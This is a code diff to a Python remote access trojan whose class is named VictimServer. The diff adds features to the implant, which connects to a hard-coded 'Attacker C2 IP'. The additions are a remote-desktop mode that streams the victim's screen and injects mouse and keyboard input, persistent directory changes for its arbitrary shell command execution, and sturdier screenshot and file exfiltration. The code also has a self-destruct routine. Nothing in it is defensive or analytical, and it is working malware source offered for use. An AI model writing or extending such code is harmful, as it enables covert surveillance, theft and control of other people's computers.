@@ -8,10 +8,13 @@ import platform
 import shutil
 import threading
 import hashlib
-from pathlib import Path
 import zlib
 import ctypes
 import ctypes.wintypes
+import mss
+import mss.tools
+from PIL import Image
+import pyautogui
 
 # Platform-agnostic configuration
 C2_HOST = '192.168.100.15'  # Attacker C2 IP
@@ -23,6 +26,7 @@ SCREENSHOT_QUALITY = 70
 
 class VictimServer:
     def __init__(self):
+        self.current_dir = os.getcwd()
         self.platform = platform.system().lower()
         self.session_id = hashlib.sha256(os.urandom(16)).hexdigest()
         self.lock = threading.Lock()
@@ -115,6 +119,9 @@ class VictimServer:
                     self.self_destruct()
                 elif command.startswith(b'CMD '):
                     self.handle_shell_command(command[4:])  # Remove "CMD " prefix
+                elif command == b'REMOTE':
+                    self.handle_remote_session()
+                    continue
                 else:
                     self._safe_send(b"Unknown command")
 
@@ -126,15 +133,27 @@ class VictimServer:
     def handle_screenshot(self):
         """Cross-platform screenshot handling"""
         try:
-            from PIL import ImageGrab  # Ensure pillow library is installed
-            filename = f"/tmp/screenshot_{int(time.time())}.jpg"
+            from PIL import ImageGrab
+            filename = f"screenshot_{int(time.time())}.jpg"
+
+            # Windows temp location
+            if self.platform == 'windows':
+                filename = os.path.join(os.getenv('TEMP'), filename)
+
+            # Take and verify screenshot
             ImageGrab.grab().save(filename, quality=SCREENSHOT_QUALITY)
+            if not os.path.exists(filename):
+                raise Exception("Screenshot file not created")
+
+            # Send with confirmation
             self.send_file(filename)
             os.remove(filename)
+            self._safe_send(b"SCREENSHOT_SUCCESS")  # Add confirmation
+
         except ImportError:
-            self._safe_send(b"Screenshot requires PIL library")
+            self._safe_send(b"ERROR: Install pillow library for screenshots")
         except Exception as e:
-            self._safe_send(f"Screenshot failed: {str(e)}".encode())
+            self._safe_send(f"SCREENSHOT_FAILED: {str(e)}".encode())
 
     def _calculate_hash(self, path):
         """Calculate SHA-256 hash of a file"""
@@ -147,16 +166,64 @@ class VictimServer:
                 sha.update(chunk)
         return sha.hexdigest()
 
+    def handle_remote_session(self):
+        """Handle remote desktop session"""
+        self._safe_send(b"REMOTE_SESSION_STARTED")
+        with mss.mss() as sct:
+            while self.running:
+                try:
+                    # Capture screen
+                    screenshot = sct.grab(sct.monitors[1])
+                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+
+                    # Compress image
+                    img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
+
+                    # Send frame
+                    self._safe_send(b'FRAME:' + img_bytes)
+
+                    # Check for input events
+                    data = self._safe_recv()
+                    if data and data.startswith(b'INPUT:'):
+                        self.process_input(data[6:])
+
+                except Exception as e:
+                    self._safe_send(f"REMOTE_ERROR: {str(e)}".encode())
+                    break
+
+    def process_input(self, data):
+        """Process input events"""
+        try:
+            event = json.loads(data.decode())
+            if event['type'] == 'mouse':
+                pyautogui.moveTo(event['x'], event['y'])
+                if event['click']:
+                    pyautogui.click()
+            elif event['type'] == 'keyboard':
+                pyautogui.press(event['key'])
+        except Exception as e:
+            print(f"Input error: {str(e)}")
+
     def handle_shell_command(self, command):
         """Execute system commands safely"""
         try:
             cmd_str = command.decode('utf-8')
+
+            # Handle CD command specially
+            if cmd_str.lower().startswith('cd '):
+                new_dir = cmd_str[3:].strip()
+                return self._change_directory(new_dir)
+
+            # Execute regular command
             proc = subprocess.Popen(
                 cmd_str,
                 shell=True,
                 stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+                cwd=self.current_dir
             )
+
             stdout, stderr = proc.communicate(timeout=30)
             output = stdout or stderr or b"No output"
             self._safe_send(output)
@@ -187,6 +254,9 @@ class VictimServer:
     def send_file(self, file_path):
         """Secure file transfer protocol"""
         try:
+            if not os.path.exists(file_path):
+                self._safe_send(b"ERROR: File not found")
+                return
             # Send metadata
             file_hash = self._calculate_hash(file_path)
             metadata = json.dumps({
@@ -269,6 +339,22 @@ class VictimServer:
         except Exception as e:
             print(f"[!] Receive error: {str(e)}")
             return None
+
+    def _change_directory(self, new_dir):
+        """Handle directory changes"""
+        try:
+            if not new_dir:
+                new_path = os.path.expanduser("~")
+            else:
+                new_path = os.path.abspath(os.path.join(self.current_dir, new_dir))
+
+            if os.path.isdir(new_path):
+                self.current_dir = new_path
+                self._safe_send(f"Current directory: {self.current_dir}".encode())
+            else:
+                self._safe_send(f"Directory not found: {new_path}".encode())
+        except Exception as e:
+            self._safe_send(f"CD error: {str(e)}".encode())
 
     def self_destruct(self):
         """Cleanup and exit"""
